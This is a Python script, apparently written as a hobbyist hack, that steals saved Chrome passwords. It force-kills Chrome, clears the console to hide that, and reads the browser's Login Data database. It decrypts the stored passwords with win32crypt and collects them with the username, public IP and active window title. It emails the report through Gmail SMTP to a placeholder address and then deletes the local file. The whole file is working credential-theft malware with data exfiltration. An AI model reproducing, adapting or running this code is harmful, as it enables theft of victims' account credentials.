// madeby parad0x 20/10/19 8:48pm

#imports
import os
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import win32gui
import socket
import requests
import sqlite3
import win32crypt

# kill chrome.exe
browserExe = "chrome.exe"
os.system("taskkill /f /im "+browserExe)
# clears console, making it invisible to user that we killed chrome's process
os.system("cls")

print("Heyyyyyy, this is a distraction while i get your passwords ;))")
time.sleep(1)

# gather user info
datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
#privateIP = socket.gethostbyname(socket.gethostname())

# get passwords

old_app = ''

def get_bytes():
  data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
  c = sqlite3.connect(data_path)
  cursor = c.cursor()
  select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
  cursor.execute(select_statement)
 
  login_data = cursor.fetchall()
 
  cred = {}
 
  string = ''
 
  string += 'Window: ' + win32gui.GetWindowText(win32gui.GetForegroundWindow()) + '\n'
 
  string += 'Date/Time: ' + datetime + '\nUsername: ' + user + '\nPublic IP: ' + publicIP + '\n'
 
 
  for url, user_name, pwd in login_data:
      pwd = win32crypt.CryptUnprotectData(pwd)
      cred[url] = (user_name, pwd[1].decode('utf8'))
      string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
      with open('report.txt', 'w') as fp:
        fp.write(string)

def send_stuff():
    # our email contents
    mail_content = 'Haha you got hacked lol'

    #email 
    sender_address = 'SENDER ADDRESS'
    sender_pass = 'SENDER PASS'
    receiver_address = 'RECEIVER ADDRESS'

    #setup mime
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'HACKED'
    message.attach(MIMEText(mail_content, 'plain'))
    attach_file_name = 'report.txt'
    attach_file = open('report.txt', 'r') # opens the file in read mode
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read())
    encoders.encode_base64(payload) # encodes the attachment
    # add payload header
    payload.add_header('Content-Discomposition', 'attachment: filename= '+attach_file_name)
    message.attach(payload)

    #smtp session (sending it)
    session = smtplib.SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(sender_address, sender_pass)
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()

    print("Data sent to " + receiver_address + "!!")



if __name__ == '__main__':
	get_bytes()
	send_stuff()

os.remove('report.txt')
